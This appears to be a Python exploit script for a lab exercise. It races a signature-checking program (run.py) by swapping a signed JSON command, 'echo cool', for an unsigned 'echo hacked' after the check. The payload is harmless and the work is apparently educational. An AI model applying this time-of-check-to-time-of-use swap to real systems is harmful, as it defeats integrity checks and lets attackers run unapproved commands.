import os
import json
from threading import Thread
from time import sleep

PATH="./foo.json"

# Run run.py from this file
def call_file():
    os.system("python3 ./run.py " + PATH)

# Create json file named foo that contains the same credentials as example.json
def create_json():
    json_file = open(PATH, "w")
    data = {"command": "echo cool", "signature": "6c68e3c88a87339fa8667cb36c82d4cf0bdcc131efcf98eb8df1867122e66e0e2e9d8d1ce01c40261fb8bde61a7768215c20febc2cd522af3a2232be73cabe3ada6d86b1635a52c787bd7d97985f4ce2ef9b47ea0c72bdb35b702f9169218adc2d4cd53eabfc3c875bef05270b703d407afb5b22198d56f3489ec8e3241c19a9"}
    json.dump(data, json_file)
    json_file.close()

# Edit the json file so the value of the key 'command' will change to 'echo hacked'
def edit_json(command):
    sleep(3)
    json_file = open(PATH, "r")
    data = json.load(json_file)
    json_file.close() 
    data['command'] = command
    json_file = open(PATH, "w")
    json.dump(data, json_file)
    json_file.close()

def main(argv):
    # create the file
    create_json()

    # create two threads that will start the running of run.py and right after that edit the command to become 'echo hacked'
    thread1 = Thread(target=call_file)
    thread2 = Thread(target=edit_json, args=('echo hacked',))
    
    thread1.start()
    thread2.start()
    
    thread2.join()
    thread1.join()


if __name__ == '__main__':
     import sys
     sys.exit(main(sys.argv))

